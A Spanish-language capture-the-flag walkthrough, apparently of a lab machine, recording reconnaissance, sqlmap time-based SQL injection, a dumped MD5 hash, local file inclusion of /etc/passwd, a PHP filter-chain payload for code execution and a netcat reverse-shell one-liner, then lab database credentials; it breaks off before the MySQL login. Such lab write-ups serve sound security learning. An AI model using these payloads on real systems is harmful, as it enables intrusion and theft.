## Step 1 — Reconnaissance


realize un escaneo con :
```bash
nmap -sV 10.66.168.77
```
raramente se muestran todos los pueetos abiertos

1217/tcp  open  tcpmux
1218/tcp  open  http                 Henry httpd 350044 (NEC Aspire WebPro http config)
1233/tcp  open  univ-appserver?
1234/tcp  open  hotline?
1236/tcp  open  oracle-vs            Oracle Virtual Service Agent (Xen)
1244/tcp  open  isbconference1?
1247/tcp  open  telnet               HP Integrated Lights Out telnetd
1248/tcp  open  http                 Microsoft ISA httpd
1259/tcp  open  opennl-voice?
1271/tcp  open  http                 Asus RT-xWathcJ WAP http config
1272/tcp  open  telnet               Fujian SVG6000R VoIP gateway telnetd
1277/tcp  open  ftp
1287/tcp  open  rtsp                 D-Link DCS-2130 or Pelco IDE10DN webcam rtspd
1296/tcp  open  http                 SMC Barricade router http config
1300/tcp  open  h323hostcallsc?
1301/tcp  open  ci3-software-1?
1309/tcp  open  ftp                  AXIS FX print server ftpd 3QTvB
1310/tcp  open  http                 Teradici PCoIP remote management http config
1311/tcp  open  rxmon?
1322/tcp  open  telnet               Epson 5.. print server telnetd
1328/tcp  open  http                 ZoneAlarm Z100G firewall http config
1334/tcp  open  writesrv?
1352/tcp  open  smtp-proxy           Tumbleweed Email Firewall smtp proxy
1417/tcp  open  http                 Cisco ASA AWARE http config xT
1433/tcp  open  smtp-proxy           MailFoundry antispam smtp proxy
1434/tcp  open  ftp                  Toshiba CTX PBX ftpd
1443/tcp  open  ms-sql-s             Microsoft SQL Server 2005 9.00.4211; SP3+
1455/tcp  open  http                 Norman Security Endpoint Protection httpd 1615819
1461/tcp  open  ibm_wrless_lan?
1494/tcp  open  http                 Chumby chumbhttpd
1500/tcp  open  smtp                 MasqMail smtpd 2shH
1501/tcp  open  sas-3?
1503/tcp  open  imtc-mcs?
1521/tcp  open  http                 HP Apache-based httpd
1524/tcp  open  ingreslock?


entre muchos mas, me parece un cooomportamiento extraño, tal vez un honeypot o un firewall ocultando los puertos realmente abiertos, de todas formas entrare al puerto mas comun, http, tiene varios servicox abiertos, mi sospecha de que son puertos falsos es que hay puertos que realmente no tienen mucho sentido, incluso hay un servidor de minecraft corriendo en un puerto http :

49175/tcp open  http                 Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older


en fin, al entrar con la direccion ip de la maquina la sitio puedo ver una tienda, con el nombre del ctf, tal vez ese sea mi punto de entrada para ver lo que realmente necesito y no perder el tiempo con los puertos "flasos"


hare fuzzing a la pagina web

```bash
gobuster dir -u 10.66.168.77 -w big.txt
```
luego de un fuzzing solo encontre una ruta de images 

.htaccess            (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
images               (Status: 301) [Size: 313] [--> http://10.66.168.77/images/]
server-status        (Status: 403) [Size: 277]


hare fuzzing sobre images 

.htaccess            (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]

no obtuve nada, vere si las imagenes contienen algun mensaje en los metadatos o algun tipo de informacion. 


[davidoberst@archlinux tmp]$ exiftool cheese2.jpg
ExifTool Version Number         : 13.55
File Name                       : cheese2.jpg
Directory                       : .
File Size                       : 23 kB
File Modification Date/Time     : 2023:09:09 22:34:35-05:00
File Access Date/Time           : 2026:06:20 23:24:26-05:00
File Inode Change Date/Time     : 2026:06:20 23:24:26-05:00
File Permissions                : -rw-r--r--
File Type                       : Extended WEBP
File Type Extension             : webp
MIME Type                       : image/webp
WebP Flags                      : EXIF, ICC Profile
Image Width                     : 512
Image Height                    : 341
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : c2ci
Profile Copyright               : CC0
Media White Point               : 0.9642 1 0.82491
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
VP8 Version                     : 0 (bicubic reconstruction, normal loop)
Horizontal Scale                : 0
Vertical Scale                  : 0
Warning                         : [minor] Improper EXIF header
Exif Byte Order                 : Little-endian (Intel, II)
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Exif Version                    : 0210
Components Configuration        : Y, Cb, Cr, -
Flashpix Version                : 0100
Color Space                     : Uncalibrated
Exif Image Width                : 512
Exif Image Height               : 341
Image Size                      : 512x341
Megapixels                      : 0.175


la imagen 2 esta corrupta y el resto de imagenes fueron ca,biadas de extension, en otra ocasion reparare la imagen dos para poder ver su contenido y vere si tiene mensajes o informacion oculta, por ahora me concentrare en el login, 


luego de loguearme, tengo la peticion web : 

POST /login.php HTTP/1.1
Host: 10.66.168.77
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://10.66.168.77
Connection: keep-alive
Referer: http://10.66.168.77/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=user&password=pass

la descatrgare y la pasare por sqlmap para revisar si es vulnerable a una inyeccion sql


sqlmap -r t.txt -p username,password --batch --dbs


       __H__
 ___ ___[.]_____ ___ ___  {1.10.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:19:40 /2026-06-21/

[00:19:40] [INFO] parsing HTTP request from 't.txt'
[00:19:40] [INFO] testing connection to the target URL
[00:19:40] [INFO] checking if the target is protected by some kind of WAF/IPS
[00:19:40] [INFO] testing if the target URL content is stable
[00:19:41] [INFO] target URL content is stable
[00:19:41] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[00:19:41] [INFO] testing for SQL injection on POST parameter 'username'
[00:19:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:19:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[00:19:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:19:42] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[00:19:42] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[00:19:42] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[00:19:43] [INFO] testing 'Generic inline queries'
[00:19:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[00:19:43] [WARNING] time-based comparison requires larger statistical model, please wait. (done)            
[00:19:43] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[00:19:44] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[00:19:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[00:19:54] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[00:19:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:19:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://10.66.168.77/secret-script.php?file=supersecretadminpanel.html'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[00:19:56] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[00:19:59] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[00:19:59] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 97 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=user' AND (SELECT 3177 FROM (SELECT(SLEEP(5)))WLBY) AND 'QzeF'='QzeF&password=pass
---
[00:20:15] [INFO] the back-end DBMS is MySQL
[00:20:15] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[00:20:20] [INFO] fetching database names
[00:20:20] [INFO] fetching number of databases
[00:20:20] [INFO] retrieved: 
[00:20:30] [INFO] adjusting time delay to 1 second due to good response times
2
[00:20:31] [INFO] retrieved: information_schema
[00:21:37] [INFO] retrieved: users
available databases [2]:
[*] information_schema
[*] users

[00:21:55] [INFO] fetched data logged to text files under '/home/davidoberst/.local/share/sqlmap/output/10.66.168.77'


Confirmó que el parámetro username es vulnerable a Time-based blind (basado en tiempo con SLEEP). Tardó 10 segundos en reaccionar ahí (00:19:s44 a 00:19:54) porque el servidor se quedó dormido tal como sqlmap le ordenó.

luego del escaneo el servidor me dirigio a (HTTP 302)  /secret-script.php?file=supersecretadminpanel.html. 

me llevo a un panel de administracion que contiene users, messages,orders. : 


vere que informacion tiene la base de datos con 


sqlmap -r t.txt -p username --batch -D users --dump

the result was : 

Database: users
Table: users
[1 entry]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 5b0c2e1b4fe1410e47f26feff7f4fc4c | comte    |
+----+----------------------------------+----------+

voy a crackear el hash md5 de la contraseña 

hashcat -m 0 5b0c2e1b4fe1410e47f26feff7f4fc4c rockyou.txt

al finalizar , hashcat no pudo crackear el hash, asi que continuare para ver si hay otros metodos de intrusion.

en el panel, pude lograr una lfi con un payload 

http://10.64.186.193/secret-script.php?file=/etc/passwd


obtuve : 

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:113:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin comte:x:1000:1000:comte:/home/comte:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash 


veo que los usuarios reales son comte y ubuntu, podria entrar por ssh a compte si tuviera el hash de la contraseña crackeado, pero como no, usare una reverse shell aprovehando la vulnerbailidad LFI : 

LFI TO RCE 

busquyue tecnicas para conseguir una reverse shell, estoy rpobando con envenenamiento de logs, 
analizando el codigo de la pagina, intentare encontrar una tecnica

<?php
  //echo "Hello World";
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
?>

encontre una herramienta en github llamada php_filter_chain_generator.py, que me ayudara a crear un payload.


python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'



me respondio : 

[+] The following gadget chain will generate the following code : <?php system("whoami"); ?> (base64 value: PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp




al ejecutar el payload en el servidor, respondio con: 

www-data � P�������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@


la vulnerabilidad esta confirmada, intentare obtener la reverse shell 


creo una reverse shell 

sudo nc -lvnp 443

genero el payload apuntando a mi maquina : 

python3 php_filter_chain_generator.py --chain "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.138.111 443 >/tmp/f'); ?>" > payload.txt


hago la peticion a la maquina victima

curl -v "http://10.65.139.198/secret-script.php?file=$(cat payload.txt)"


la reverse sehll cargo : 

Connection received on 10.65.139.198 35450
sh: 0: can't access tty; job control turned off
$ pwd
/var/www/html
$ 
 

encontre el script de la base de datos que hashea los md5, veo que sus credenciales estan ahi :


$ ls
adminpanel.css
images
index.html
login.css
login.php
messages.html
orders.html
secret-script.php
style.css
supersecretadminpanel.html
supersecretmessageforadmin
users.html
$ cat login.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="login.css">
</head>
<body>
    <div class="login-container">
        <h1>Login</h1>
        
        <form method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Login</button>
        </form>
        
    </div>
    <?php
// Replace these with your database credentials
$servername = "localhost";
$user = "comte";
$password = "VeryCheesyPassword";
$dbname = "users";

// Create a connection to the database
$conn = new mysqli($servername, $user, $password, $dbname);

// Check the connection
if ($conn->connect_error) {
    echo $conn->connect_error;
    die("Connection failed: " . $conn->connect_error);

}

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $pass = $_POST["password"];
    function filterOrVariations($input) {
     //Use case-insensitive regular expression to filter 'OR', 'or', 'Or', and 'oR'
    $filtered = preg_replace('/\b[oO][rR]\b/', '', $input);
    
    return $filtered;
}
    $filteredInput = filterOrVariations($username);
    //echo($filteredInput);
    // Hash the password (you should use a stronger hashing algorithm)
    $hashed_password = md5($pass);
    
    
    // Query the database to check if the user exists
    $sql = "SELECT * FROM users WHERE username='$filteredInput' AND password='$hashed_password'";
    $result = $conn->query($sql);
    $status = "";
    if ($result->num_rows == 1) {
        // Authentication successful
        $status = "Login successful!";
         header("Location: secret-script.php?file=supersecretadminpanel.html");
         exit;
    } else {
        // Authentication failed
         $status = "Login failed. Please check your username and password.";
    }
}
// Close the database connection
$conn->close();
?>
<div id = "status"><?php echo $status; ?></div>
</body>
</html>


intentare ver si el puerto sql esta abierto para conectarme 

$ ss -tlnp     
State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process  
LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*              
LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*              
LISTEN   0        10               0.0.0.0:4444          0.0.0.0:*              
LISTEN   0        128              0.0.0.0:22            0.0.0.0:*              
LISTEN   0        128                 [::]:22               [::]:*              
LISTEN   0        511                    *:80                  *:*              
$ 


si, esta abierto, me conectare con las credenciales : 

